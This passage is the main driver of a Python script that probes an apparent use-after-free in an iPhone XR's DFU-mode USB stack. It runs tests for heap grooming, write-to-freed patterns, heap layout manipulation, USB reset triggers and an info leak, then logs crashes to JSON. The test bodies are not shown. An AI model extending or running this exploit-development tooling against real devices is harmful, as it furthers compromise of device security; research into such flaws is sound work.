    st = get_status(d)
    log(f"Connected. State={st['bState'] if st else 'UNKNOWN'}")
    if st and st["bState"] == 10:
        clear_status(d)
        st = get_status(d)
        log(f"Cleared error → state={st['bState'] if st else 'UNKNOWN'}")
    
    all_results = {}
    tests = {
        "A": ("Stall-based grooming", test_A_stall_grooming),
        "B": ("Incomplete transfer", test_B_incomplete_transfer),
        "C": ("Write-to-freed patterns", test_C_write_to_freed),
        "D": ("USB reset trigger", test_D_usb_reset_trigger),
        "E": ("Double-abort probing", test_E_double_abort),
        "F": ("Vendor request heap", test_F_vendor_requests),
        "G": ("Heap layout manipulation", test_G_heap_layout),
        "H": ("UPLOAD info leak", test_H_upload_leak),
    }
    
    run_tests = list(tests.keys()) if args.test == "all" else [args.test]
    
    for tid in run_tests:
        name, fn = tests[tid]
        log(f"\n{'#'*60}")
        log(f"# Running Test {tid}: {name}")
        log(f"{'#'*60}")
        
        # Ensure device is available
        d = connect()
        if not d:
            log(f"  Device lost before test {tid}, waiting...")
            d = wait_dfu(90)
            if not d:
                log(f"  SKIP test {tid}: no device")
                all_results[tid] = {"test": f"test_{tid}", "error": "no_device"}
                continue
        
        reset_idle(d)
        
        try:
            result = fn(d)
            all_results[tid] = result
            log(f"\n  Test {tid} complete: {len(result.get('results', []))} sub-results")
        except Exception as e:
            log(f"\n  Test {tid} EXCEPTION: {e}")
            traceback.print_exc()
            all_results[tid] = {"test": f"test_{tid}", "exception": str(e)}
    
    # Save results
    outf = Path(__file__).parent / "results" / "uaf_characterization_v2.json"
    outf.parent.mkdir(exist_ok=True)
    output = {
        "timestamp": datetime.now().isoformat(),
        "device": "iPhone XR (A12/T8020)",
        "script": "uaf_characterize_v2.py",
        "tests_run": run_tests,
        "results": all_results
    }
    with open(outf, "w") as f:
        json.dump(output, f, indent=2)
    log(f"\n{'='*60}")
    log(f"All results saved: {outf}")
    log(f"{'='*60}")
    
    # Summary
    log("\nSUMMARY:")
    for tid, res in all_results.items():
        name = tests[tid][0] if tid in tests else tid
        n_results = len(res.get("results", []))
        crashes = sum(1 for r in res.get("results", []) if r.get("crashed"))
        survived = sum(1 for r in res.get("results", []) if r.get("survived"))
        log(f"  {tid} ({name}): {n_results} sub-tests, {crashes} crashes, {survived} survived")

if __name__ == "__main__":
    main()
